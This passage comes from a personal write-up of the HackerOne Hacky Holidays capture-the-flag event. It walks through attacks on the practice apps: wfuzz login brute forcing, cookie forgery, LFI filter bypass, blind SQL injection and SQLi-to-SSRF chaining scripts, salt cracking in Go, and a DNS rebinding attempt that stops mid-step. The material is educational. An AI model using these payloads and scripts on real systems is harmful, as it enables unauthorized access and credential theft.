21  "cookie": "M2Q2MDIzNDg5MWE0N2M3NDJmNTIyNGM3NWUxYWQ0NDRlZWI3MTg4MjI3ZGRkMTllZTM2ZDkxMGVlNWEwNmZiZWFkZjZhODg4MDY3ODlmZGRhYTM1Y2IyMGVhMjA1NjdiNDFjYzBhMWQ4NDU1MDc4NDE1YmI5YTJjODBkMjFmN2Y="
22}
23{
24  "user": null,
25  "cookie": "MWY3MTAzMTBjZGY4ZGMwYjI3Zjk2ZmYzMWJlMWEyZTg1YzE0MmZlZjMwYmJjZmQ4ZTU0Y2YxYzVmZTM1N2Q1ODY2YjFkZmFiNmI5ZjI1M2M2MDViNjA0ZjFjNDVkNTQ4N2U2ODdiNTJlMmFiMTExODA4MjU2MzkxZWNhNjFkNmU="
26}
27{
28  "user": null,
29  "cookie": "MDM4YzhiN2Q3MmY0YjU2M2FkZmFlNDMwMTI5MjEyODhlNGFkMmI5OTcyMDlkNTJhZTc4YjUxZjIzN2Q4NmRjNjg2NmU1MzVlOWEzOTE5NWYyOTcwNmJlZDIyNDgyMTA5ZDA1OTliMTYyNDczNjFkZmU0MTgxYWEwMDU1ZWNhNzQ="
30}
31{
32  "user": null,
33  "cookie": "OGI3N2ExOGVjNzM1ZWVmNTk2ZjNkZjIwM2ZjYzdjMWNhODg4NDhhODRmNjI0NDRjZTdlZTg0ZTUwNzZmZDdkYTJjN2IyODY5YjcxZmI5ZGRiYTgzZjhiZDViOWZjMTVlZDgzMTBkNzNmODI0OTM5ZDM3Y2JjZmY4NzEyOGE3NTM="
34}
I now had a session associated with an authenticated user (the third one down in the list). Using the cookie didn't seem to have any effect, so I went back to try and figure out what was up with the user endpoint.
This time I used wfuzz to try and find the missing parameter(s).
Code 100 Bytes
1wfuzz --hc=400 -zfile,wordlists/params.txt https://hackyholidays.h1ctf.com/swag-shop/api/user?FUZZ=1
This revealed the uuid parameter:
<image_4>
When I decoded the session data, there was a UUID (C7DCCE-0E0DAB-B20226-FC92EA-1B9043) included in the user parameter. This couldn't be a coincidence! I used it in the uuid parameter on the user endpoint:
Code 316 Bytes
1$ curl https://hackyholidays.h1ctf.com/swag-shop/api/user?uuid=C7DCCE-0E0DAB-B20226-FC92EA-1B9043
2{"uuid":"C7DCCE-0E0DAB-B20226-FC92EA-1B9043","username":"grinch","address":{"line_1":"The Grinch","line_2":"The Cave","line_3":"Mount Crumpit","line_4":"Whoville"},"flag":"flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}"}% 
And there was the flag!
Flag: flag{972e7072-b1b6-4bf7-b825-a912d3fd38d6}
Flag 5: Secure Login
The page at /secure-login consisted of a fairly minimal login form.
Trying SQL injection etc. yielded no results, but there was an interesting error message here when I entered some gibberish:
<image_5>
The login page specifically told me when the supplied username was invalid, as opposed to giving a generic "login failed" message that didn't explain whether it was the username or password at fault. This means I could brute-force for a valid username.
I cracked open wfuzz again:
Code 794 Bytes
1$ wfuzz -zfile,wordlists/usernames.txt --hs 'Invalid Username' -d 'username=FUZZ&password=blah' https://hackyholidays.h1ctf.com/secure-login
2
3********************************************************
4* Wfuzz 2.4.2 - The Web Fuzzer                         *
5********************************************************
6
7Target: https://hackyholidays.h1ctf.com/secure-login
8Total requests: 22342
9
10===================================================================
11ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
12===================================================================
13
14000005730:   200        36 L     84 W     1724 Ch     "access"  
Nice, wfuzz found a username: access. I tried to login with this username and a random password, and got a new error:
<image_6>
Next it was just a matter of brute forcing the password...
Code 795 Bytes
1wfuzz -zfile,wordlists/passwords.txt --hs 'Invalid Password' -d 'username=access&password=FUZZ' https://hackyholidays.h1ctf.com/secure-login 
2
3********************************************************
4* Wfuzz 2.4.2 - The Web Fuzzer                         *
5********************************************************
6
7Target: https://hackyholidays.h1ctf.com/secure-login
8Total requests: 9953
9
10===================================================================
11ID           Response   Lines    Word     Chars       Payload                                                                                                                                             
12===================================================================
13
14000000053:   302        0 L      0 W      0 Ch        "computer" 
...and then I had a password too! I tried to login with access:computer to collect the flag!
<image_7>
...or maybe not. There was no flag there. I took a look around at the new page and noticed the securelogin cookie that had been set during login.
<image_8>
The cookie had a value of eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjpmYWxzZX0=, which base64 decoded to {"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":false}. I encoded a new JSON object with admin set to true and refreshed the page, hoping to elevate my access...
Code 161 Bytes
1$ echo '{"cookie":"1b5e5f2c9d58a30af4e16a71a45d0172","admin":true}' | base64 -w0
2eyJjb29raWUiOiIxYjVlNWYyYzlkNThhMzBhZjRlMTZhNzFhNDVkMDE3MiIsImFkbWluIjp0cnVlfQo=
Setting the securelogin cookie to the value encoded above and reloading the page revealed a new file I could now download.
<image_9>
I downloaded the my_secure_files_not_for_you.zip, and found it was password protected. A great tool for brute forcing zip passwords is fcrackzip, so I pointed it at the archive and pulled the trigger:
Code 114 Bytes
1fcrackzip -u -D -p wordlists/passwords.txt my_secure_files_not_for_you.zip    
2
3PASSWORD FOUND!!!!: pw == hahahaha
The password was hahahaha! Unzipping revealed two interesting things.
Firstly I had what appeared to be a Grinch nude (!?)
<image_10>
I'm not sure what impact this had on my one-year old son who was watching. I guess I'll find out in a few years. Anyway, the other file was flag.txt:
Code 58 Bytes
1$ cat flag.txt 
2flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Solved!
Flag: flag{2e6f9bf8-fdbd-483b-8c18-bdf371b2b004}
Flag 6: Diary
The challenge started at https://hackyholidays.h1ctf.com/my-diary/?template=entries.html. This straight-up looked like an LFI vulnerability, so I tried a few obvious values for the template parameter such as /etc/passwd, ../../../../../../../etc/passwd and found nothing - everything resulted in a redirect back to the original URL.
I thought it'd be a good idea to try to locate entries.html and see if it was publicly accessible. It turned out that https://hackyholidays.h1ctf.com/my-diary/entries.html was it's actual location. In that case, the template parameter was loading files relative to it's own directory. For that reason I tried index.php as a template value, to trick the script into providing me with it's own source code:
Code 689 Bytes
1<?php
2if( isset($_GET["template"])  ){
3    $page = $_GET["template"];
4    //remove non allowed characters
5    $page = preg_replace('/([^a-zA-Z0-9.])/','',$page);
6    //protect admin.php from being read
7    $page = str_replace("admin.php","",$page);
8    //I've changed the admin file to secretadmin.php for more security!
9    $page = str_replace("secretadmin.php","",$page);
10    //check file exists
11    if( file_exists($page) ){
12       echo file_get_contents($page);
13    }else{
14        //redirect to home
15        header("Location: /my-diary/?template=entries.html");
16        exit();
17    }
18}else{
19    //redirect to home
20    header("Location: /my-diary/?template=entries.html");
21    exit();
22}
It worked! I now had the source code of the script. It looked like there was once an admin.php page, which according to a comment, had been renamed to secretadmin.php. Trying to hit that file directly in the browser resulted in:
Code 46 Bytes
1You cannot view this page from your IP Address
I couldn't simply pass secretadmin.php as an argument to the original script to read the file, because it did a couple of string replacements on the passed parameter:
Code 112 Bytes
1// ...
2$page = str_replace("admin.php","",$page);
3// ...
4$page = str_replace("secretadmin.php","",$page);
5// ...
So passing secretadmin.php would result in a value of secret, because of the s/admin\.php// replacement.
I bypassed this questionable security measure by passing a value of secretadsecretaadmin.phpdmin.phpmin.php.
This works because:
Replacing admin.php in secretadsecretaadmin.phpdmin.phpmin.php results in secretadsecretadmin.phpmin.php
Replacing secretadmin.php in secretadsecretadmin.phpmin.php results in secretadmin.php
Code 188 Bytes
1$ curl -s https://hackyholidays.h1ctf.com/my-diary/?template=secretadsecretaadmin.phpdmin.phpmin.php | grep flag
2    <h4 class="text-center">flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}</h4>
Success!
Flag: flag{18b130a7-3a79-4c70-b73b-7f23fa95d395}
Flag 7: Hate Mail Generator
Starting out, I could see I had access to some sort of email campaign management application.
<image_11>
Clicking Create New prompted for name, subject and markup fields. Having access to a markup field made me think this was going to be something like XSS or SSTI.
Looking at the campaign which was already there provided another interesting bit of info:
<image_12>
It seemed the templating language supported the inclusion of other files. An LFI vuln? I set up a new campaign with a template directive for a file which didn't exist:
<image_13>
Hitting Preview resulted in an error which disclosed the location of a templates directory.
Code 45 Bytes
1Cannot find template file /templates/whatever
Directory listings were enabled for the /hate-mail-generator/templates/ directory, and disclosed the existence of 38dhs_admins_only_header.html.
<image_14>
Navigating to this file directly resulted in a 403, so I tried to use the template directive again to read it via a campaign preview:
<image_15>
My smugness dissipated when the approach failed with You do not have access to the file 38dhs_admins_only_header.html.
Taking a step back and doing a bit more recon meant that I spotted an HTML block that looked helpful:
<image_16>
Whilst the markup in the campaign editor did not allow the inclusion of the admin-only file, perhaps this content did? First of all I adjusted the content to the following with dev tools:
<image_17>
Then I set the content of the campaign markup to {{name}} to make use of the variable I modified. Hitting preview then gave me the flag:
<image_18>
Flag: flag{5bee8cf2-acf2-4a08-a35f-b48d5e979fdd}
Flag 8: Forum
After taking a look around this forum, I couldn't find any immediate issues. Fuzzing revealed the presence of phpMyAdmin at /forum/phpmyadmin, but the default login did not work.
In order to check if the forum was based on any open-source software, I searched for one of the messages: You need to be an admin to view these posts on GitHub. Not only was it running software that was found on GitHub, the code was listed under the organisation Grinch-Networks.
<image_19>
Browsing the commit history revealed some juicy database credentials that looked to have been committed by accident at some stage and later removed: forum:6HgeAZ0qC9T6CQIqJpD
<image_20>
I logged in to phpMyAdmin with the discovered credentials. Browsing the users table revealed some usernames and hashed passwords. The other tables were not accessible in phpMyAdmin.
<image_21>
Instead of cracking the hashes, I googled them - it's a much quicker way to crack hashes than bruting them locally! The grinch users hash was 35D652126CA1706B59DB02C93E0C9FBF, and turned out to be a hash of BahHumbug.
At this point I could log in to the forum with grinch:BahHumbug and view an admin-only post containing the flag.
<image_22>
Flag: flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
Flag 9: Evil Quiz
Filling out the quiz with some random answers to get a feel for the process resulted in the following page being shown:
<image_23>
The message about the number of players with the same name was quite revealing here. It told me that the quiz was stateful. It remembered the names of all players that filled it out. This meant there was likely a database backing this application. I immediately started thinking along the lines of a potential SQL injection vulnerability.
I went back to the beginning and set the name field to ' OR sleep(5)='. Proceeding into the rest of the quiz resulted in 5 second delays, meaning an SQL injection vulnerability was indeed present. The final page included the message There is 1195892 other player(s) with the same name as you! which suggests my attack was at least working on the query to calculate the number of players with a similar name.
I started the process of working out what tables/columns existed and what data I could exfiltrate.
First of all I worked out the number of columns being returned in the query by trying the following:
Name	# of players
Jfjrir' union select 1;/*	0
Jfjrir' union select 1,2;/*	0
Jfjrir' union select 1,2,3;/*	0
Jfjrir' union select 1,2,3,4;/*	1
4 columns then! Normally at this point I'd start pulling data from information_schema.tables, but before resorting to this I tested to see if I could guess the names of some existing tables. I got lucky and Jfjrir' union select 1,2,3,4 from admin;/* returned a single row (player).
After tweaking the query a few times I figured out that a user with the username of admin existed in the table - at this point I started writing a script to pull out the admin password:
Code 843 Bytes
1#!/usr/bin/env python3
2import requests
3
4url='https://hackyholidays.h1ctf.com/evil-quiz'
5cookies={'session': '4fbc0cc824c9ee373d677e1840288aaf'}
6alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890-=!"£$%^&*()_+[];#,./{}:@~<>?'
7
8def attack(password):
9    index=len(password)+1
10    for letter in alphabet:
11        data={'name': "Jfjrir' union select 1,2,3,4 from admin where username ='admin' and ord(substr(password, %d, 1))='%d" % (index, ord(letter))}
12        r = requests.post(url, cookies=cookies, data=data)
13        r = requests.get(url + '/score', cookies=cookies)
14        if 'There is 1 other' in r.text:
15            return password + letter
16    return password
17
18password=''
19while True:
20    np=attack(password)
21    if np == password:
22        print("Password found: '%s'" % (password))
23        break
24    password=np
25
Running the script:
Code 47 Bytes
1$ ./quiz.py
2Password found: 'S3creT_p4ssw0rd-$'
Logging in to the admin area with admin:S3creT_p4ssw0rd-$ gave me the flag.
Flag: flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
Flag 10: SignUp Manager
After a little basic recon, I spotted a comment at the top of the initial page:
Code 37 Bytes
1<!-- See README.md for assistance -->
There was indeed a /signup-manager/README.md, which contained:
Code 712 Bytes
1# SignUp Manager
2
3SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.
4
5### How to Install
6
71) Create a directory that you wish SignUp Manager to be installed into
8
92) Move signupmanager.zip into the new directory and unzip it.
10
113) For security move users.txt into a directory that cannot be read from website visitors
12
134) Update index.php with the location of your users.txt file
14
155) Edit the user and admin php files to display your hidden content
16
176) You can make anyone an admin by changing the last character in the users.txt file to a Y
18
197) Default login is admin / password
Lots of info there! After playing with the form it seemed I could add users and sign in as them, so it made sense that I needed to elevate my privileges to admin level to find the flag. Step 6 in the README mentioned tweaking the last character of the users.txt file in order to make somebody admin, so it looked like I needed to find a way to do that.
The README also mentioned a signupmanager.zip file which was also available in the same directory. I downloaded and extracted it.
At this point I was stuck for about 8 hours, as for me the zip was corrupt and only extracted a single file. This seems to have happened to others according to Twitter so not sure what happened there, but after downloading it again later it contained more files. Weird!
Anyway, the index.php contained the following:
Code 4.07 KiB
1<?php
2if( isset($_GET["logout"]) ){
3    setcookie('token',null,time()-3600);
4    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
5    exit();
6}
7function buildUsers(){
8    $users = array();
9    $users_txt = file_get_contents('users.txt');
10    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
11        if( strlen($user_str) == 113 ) {
12            $username = str_replace('#', '', substr($user_str, 0, 15));
13            $users[$username] = array(
14                'username' => $username,
15                'password' => str_replace('#', '', substr($user_str, 15, 32)),
16                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
17                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
18                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
19                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
20                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
21            );
22        }
23    }
24    return $users;
25}
26function addUser($username,$password,$age,$firstname,$lastname){
27    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
28    $line = '';
29    $line .= str_pad( $username,15,"#");
30    $line .= $password;
31    $line .= $random_hash;
32    $line .= str_pad( $age,3,"#");
33    $line .= str_pad( $firstname,15,"#");
34    $line .= str_pad( $lastname,15,"#");
35    $line .= 'N';
36    $line = substr($line,0,113);
37    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
38    return $random_hash;
39}
40$all_users = buildUsers();
41$page = 'signup.php';
42if( isset($_COOKIE["token"]) ){
43    foreach( $all_users as $u ){
44        if( $u["cookie"] === $_COOKIE["token"] ){
45            if( $u["admin"] ){
46                $page = 'admin.php';
47            }else{
48                $page = 'user.php';
49            }
50        }
51    }
52}
53if( $page == 'signup.php' ) {
54    $errors = array();
55    if (isset($_POST["action"])) {
56        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
57            if( isset($all_users[ $_POST["username"] ]) ){
58                $u = $all_users[ $_POST["username"] ];
59                if( md5($_POST["password"]) === $u["password"] ){
60                    setcookie('token', $u["cookie"], time() + 3600);
61                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
62                    exit();
63                }
64            }
65            $errors[] = 'Username and password combination not found';
66        }
67        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
68            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
69            if (strlen($username) < 3) {
70                $errors[] = 'Username must by at least 3 characters';
71            } else {
72                if (isset($all_users[$username])) {
73                    $errors[] = 'Username already exists';
74                }
75            }
76            $password = md5($_POST["password"]);
77            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
78            if (strlen($firstname) < 3) {
79                $errors[] = 'First name must by at least 3 characters';
80            }
81            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
82            if (strlen($lastname) < 3) {
83                $errors[] = 'Last name must by at least 3 characters';
84            }
85            if (!is_numeric($_POST["age"])) {
86                $errors[] = 'Age entered is invalid';
87            }
88            if (strlen($_POST["age"]) > 3) {
89                $errors[] = 'Age entered is too long';
90            }
91            $age = intval($_POST["age"]);
92            if (count($errors) === 0) {
93                $cookie = addUser($username, $password, $age, $firstname, $lastname);
94                setcookie('token', $cookie, time() + 3600);
95                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
96                exit();
97            }
98        }
99    }
100}
101include_once($page);
So each field in the users.txt has it's length capped to a set value. This meant that whether or not the user was an admin Y/N was always present at the same offset for each line.
If I could find a way to make another field too long, I could shift my own content (Y) into the position of the N and become admin. All of the fields are explicitly capped to certain lengths, except for age.
I ascertained the following about the age field from the above code:
It must be numeric
It must have a maximum string length of 3
It will be padded to a length of 3 characters if it is too short (<3 chars)
Is preceeded in users.txt by the lastname field.
I realised the exponent format value 1e3 would meet the above criteria, but be longer than 3 characters when converted to an integer (1000). This would mean the last character of my last name would be pushed into the admin field. So setting the last character of my last name to Y and making sure it was the maximum length of a last name (15 characters) should result in the system signing me up as an admin user.
I signed up with an age of 1e3 (using dev tools to change the value of the dropdown option):
<image_24>
...and a last name of YYYYYYYYYYYYYYY...
<image_25>
...and was presented with the flag. Success!
Flag: flag{99309f0f-1752-44a5-af1e-a03e4150757d}
Flag 11: Recon
No new app was added for this challenge, so at first I wasn't sure where to start. Going back and completing the previous flag again resulted in a new message being shown with a link to a new directory: /r3c0n_server_4fdk59.
<image_26>
There was a lot going on here. First of all the presence of an API was mentioned at the top of the page. Then there was a list of recon photo albums, each containing one or more photos. Additionally, a link to an "attack box" was included that resulted in a login page.
API
Since the comment mentioned an API, I tried /r3c0n_server_4fdk59/api and found a page about API response codes.
<image_27>
I tried fuzzing the /r3c0n_server_4fdk59/api path for endpoints, but all requests resulted in a 401 status code. The docs note that a 401 means Unauthenticated Request or Invalid client IP in this context. So I either needed to bolt on an Authorization header to our requests, or I needed to make the requests from a particular location, likely localhost.
Recon Gallery
I tried messing with the parameters of each gallery script, and found that adding ' or '1'='2 to the end of the /r3c0n_server_4fdk59/album?hash=jdh34k URL was successful, and it looked vulnerable to SQL injection.
After some manual fiddling, I ascertained that there were two tables, but sadly no sensitive data available.
I used the following to dump the tables and columns:
Code 237 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(table_name,%27:%27,column_name))%20from%20information_schema.columns%20WHERE%20table_schema=%27recon%27;/*
Here's an example of most of the database content being dumped:
Code 349 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20ALL%20SELECT%201,%27BLAH%27,group_concat(concat(%27\n\nPhoto%20ID:%20%27,%20photo.id,%27%20\nPhoto:%27,photo,%27%20%20\nAlbum%20hash:%20%27,%20hash,%27\nAlbum%20ID:%20%27,album.id))%20from%20photo%20LEFT%20JOIN%20album%20on%20album.id%3dphoto.album_id%20limit%201;/*
The above spat out:
Code 543 Bytes
1Photo ID: 1 
2Photo:0a382c6177b04386e1a45ceeaa812e4e.jpg  
3Album hash: 3dir42
4Album ID: 1,
5
6Photo ID: 2 
7Photo:1254314b8292b8f790862d63fa5dce8f.jpg  
8Album hash: 3dir42
9Album ID: 1,
10
11Photo ID: 3 
12Photo:32febb19572b12435a6a390c08e8d3da.jpg  
13Album hash: 59grop
14Album ID: 2,
15
16Photo ID: 4 
17Photo:db507bdb186d33a719eb045603020cec.jpg  
18Album hash: jdh34k
19Album ID: 3,
20
21Photo ID: 5 
22Photo:9b881af8b32ff07f6daada95ff70dc3a.jpg  
23Album hash: jdh34k
24Album ID: 3,
25
26Photo ID: 6 
27Photo:13d74554c30e1069714a5a9edda8c94d.jpg  
28Album hash: jdh34k
29Album ID: 3
At this point it looked like there was nothing else in the database to squeeze out.
Some of my earlier manual fiddling resulted in asdasd' UNION ALL SELECT 1,1,1;/* pulling back photos from an album. Changing the first 1 to 2 and then 3 pulled back photos from each of the other two photo albums. This made me think the page was running two queries behind the scenes. Something along the lines of:
Pull the requested photo album out by it's hash (from query param hash):
SELECT id, x, y FROM albums WHERE hash = ?
And then pull all photos out for that album, using the returned id from the above query as the album id:
SELECT * FROM photos WHERE album_id = ?
I had also taken a look at the script that loaded each image content. The output of the gallery script loaded images using the following:
<image_28>
Decoding the base64 parameter for one of them revealed:
Code 120 Bytes
1{"image":"r3c0n_server_4fdk59\/uploads\/0a382c6177b04386e1a45ceeaa812e4e.jpg","auth":"ec5a9920e177ccc84974146f93ae04b0"}
I realised I could potentially trick the picture script into including other local files by abusing the data parameter, if I set the image field in the JSON to an arbritary file. It turned out this didn't work because of the auth hash. It looked like this hash was a hash of the image value and an unknown salt, meaning this wasn't exploitable without further information - I would have needed to set the hash to the correct value, which was unknowable. I tried brute forcing salts but didn't get anywhere.
At this point it clicked that these two vulnerabilities could be chained - I could use the SQL injection to set an arbitrary path, and the gallery script would automatically set the auth hash for me, then calling the picture script with the gallery-generated value would give me LFI (or SSRF).
Code 180 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%220a382c6177b04386e1a45ceeaa812e4e.jpg\%22;/*%22,1,1;/*
This request worked - I could now control the source of the image on the page!
Chaining Vulnerabilities
I realised that the picture script could be pulling images via an HTTP request internally, rather than including them, which would mean a way to call the API from localhost via SSRF.
I assembled the following request to verify if the images were being pulled via HTTP request or direct inclusion. It simply involved adding a query string parameter ?whatever=1 to the previous URL. The plan was the query parameter whatever would be handled properly by an HTTP server (effectively ignored), but would not be translatable to the file system of the host.
Code 193 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%220a382c6177b04386e1a45ceeaa812e4e.jpg?whatever%3d1\%22;/*%22,1,1;/*
This request worked - the image was still loaded. So it looked like I had an SSRF vulnerability - via SQL injection - inside of another SQL injection.
<image_29>
The image paths in the database that I dumped earlier were simply filenames with no directory information. I knew from decoding the base64 in the picture links that the images live in the uploads directory, so any SSRF paths need to be constructed relative to that directory.
I wanted to try and call the API via the SSRF, so I assembled the following:
Code 156 Bytes
1https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*
Calling this URL gave us a picture endpoint URL which should result in an SSRF on the api/hello endpoint. I didn't expect this endpoint to actually exist - but I was hoping for an improvement on the 401 received by calling anything api/* directly over the internet. A 404 would be nice.
Code 661 Bytes
1$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,2,\%22../api/hello\%22;/*%22,1,1;/*' | grep picture
2                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0=">
3
4$ curl -s 'https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcL2hlbGxvIiwiYXV0aCI6ImEwZTY4MmQ2YjRiNWVjYTM2NDJlMTU5NmQ4OGE5MDk2In0='
5
6Expected HTTP status 200, Received: 404
This was interesting! The picture script complained that it wanted a 200 status, but got a 404 instead. This meant I was no longer experiencing 401 statuses!
I tried a few common endpoints and spotted a 200 response for the api/user endpoint. Sadly the raw response wasn't returned, as the picture script complained about a bad content type, probably because it was expecting an image and instead received some JSON describing a user!
I tried appending some query string parameters to see if it was possible to check for the existance of different users, and spotted that when ?username=blah was appended, a 404 was returned! So it looked possible to brute force usernames. I tried this and was initially unsuccessful, until I spotted ?username=%25 didn't return a 404! Wildcards were accepted, meaning I could brute force much quicker!
I knocked up a bit of Python to do the job for me:
Code 861 Bytes
1#!/usr/bin/env python3
2import requests
3from bs4 import BeautifulSoup as BSHTML
4
5start=''
6alphabet='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_-'
7
8def guess(start):
9    for letter in alphabet:
10        attempt=start+letter
11        url = f'''https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=asdasd%27%20UNION%20SELECT%20%224%27%20UNION%20SELECT%201,1,\%22../api/user?username={attempt}%25\%22;/*%22,1,1;/*'''
12        r = requests.get(url)
13        soup = BSHTML(r.text, "html.parser")
14        images = soup.findAll('img')
15        r = requests.get("https://hackyholidays.h1ctf.com" + images[1]["src"])
16        if len(r.text) != 39:
17            return attempt
18    return start
19
20updated=guess(start)
21while updated != start:
22    start = updated
23    updated=guess(start)
24    print("nearly there: " + updated)
25
26print("found: " + updated)
Running the script quickly revealed:
Code 18 Bytes
1found: grinchadmin
Awesome! Next I needed to find the password - could it be as simple as doing the same thing with a password parameter? I didn't expect this to work, but it did! I adjusted the above script and swapped ?username= for ?password= and ran it, finding:
Code 17 Bytes
1found: s4nt4sucks
I now had a set of credentials: grinchadmin:s4nt4sucks. Going back to the login page I spotted at the beginning of the challenge and trying these credentials there seemed like a logical next step, so I did so.

Another flag down!
Flag: flag{07a03135-9778-4dee-a83c-7ec330728e72}
Flag 12: DDoS
This challenge continues from where I left off in the previous one. I had access to the "attack box", which contained links to launch DDoS attacks on various preset targets.
The links looked like this:
Code 150 Bytes
1https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
Clicking the above link resulted in a DDoS attack being launched, which hilariously is the l33t hacker tool ping!
<image_30>
I decoded the payload parameter from the above link and found:
Code 67 Bytes
1{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}
So the payload contained the IP address to launch an attack against. I tried to encode my own payload with a target of 127.0.0.1:
Code 176 Bytes
1$ echo '{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}' | base64 -w 0
2eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQo=
Navigating to the original link but with the payload swapped out for the one I generated above resulted in an error:
Code 23 Bytes
1Invalid Protection Hash
In order to supply my own target, I needed to also provide a valid hash parameter. So what could this be? The most likely setup was this hash was generated from a combination of the target value and a secret salt, which I didn't know.
However, I had a valid example with a target and it's associated hash, so I could try to brute force the salt.
I wrote a quick bit of Go for speed, and loaded up rockyou.txt as my wordlist. This created MD5 hashes of 203.0.113.33 appended to each word in the wordlist, and each word in the wordlist appended to 203.0.113.33 i.e. md5("${ip}${salt}") and md5("${salt}${ip}"). It would stop when a produced hash matched the epxected one: 5f2940d65ca4140cc18d0878bc398955.
Code 715 Bytes
1package main
2
3import (
4	"bufio"
5	"crypto/md5"
6	"fmt"
7	"io"
8	"os"
9)
10
11const target = "5f2940d65ca4140cc18d0878bc398955"
12const input = `203.0.113.33`
13
14func main() {
15	file, err := os.Open("/home/liamg/Downloads/rockyou.txt")
16	if err != nil {
17		panic(err)
18	}
19	defer file.Close()
20
21	scanner := bufio.NewScanner(file)
22	for scanner.Scan() {
23		salt := scanner.Text()
24		if hash(input+salt) == target {
25			panic("Found salt md5(input+salt): " + salt)
26		}
27		if hash(salt+input) == target {
28			panic("Found salt md5(salt+input): " + salt)
29		}
30	}
31
32	if err := scanner.Err(); err != nil {
33		panic(err)
34	}
35
36	panic("FAILED")
37}
38
39func hash(i string) string {
40	h := md5.New()
41	io.WriteString(h, i)
42	return fmt.Sprintf("%x", h.Sum(nil))
43}
After 30 seconds or so, this program spat out the salt!
Code 39 Bytes
1Found salt md5(salt+input): mrgrinch463
Amazing! Now I had the means to make the DDoS system trust my payload and take 127.0.0.1 as a parameter, forcing it to launch an attack on itself!
Code 77 Bytes
1$ echo -n "mrgrinch463127.0.0.1" | md5sum
23e3f8df1658372edf0214e202acb460b  -
Assembling the payload:
Code 176 Bytes
1$ echo '{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"}' | base64 -w0
2eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQo= 
Trying it out on the endpoint:
<image_31>
The system detected the target was local and cancelled the attack.
I decided to try 127.0.0.2, which will also point at the local machine via loopback. This worked, and the attack was launched, but it was an unintended solution, as I didn't get presented with the flag:
<image_32>
I went back to the drawing board to try and find the intended route. The attack script looked like it did a couple of things. First of all it got "host information", which I assumed meant resolving a hostname to an IP address and deciding if it was a local IP. Next it launched an attack on the given address.
After a bit of trial and error, I tried a DNS rebind attack. If I could provide a hostname which resolved to an "external" IP on the first step, but then resolved to 127.0.0.1 on the second, the check would pass and an attack would be launched on the local machine.
I built a payload using the 7f000001.c0a80001.rbndr.us address provided by taviso/rbndr, which will constantly switch between resolving to 192.168.0.1 and 127.0.0.1:
Code 171 Bytes
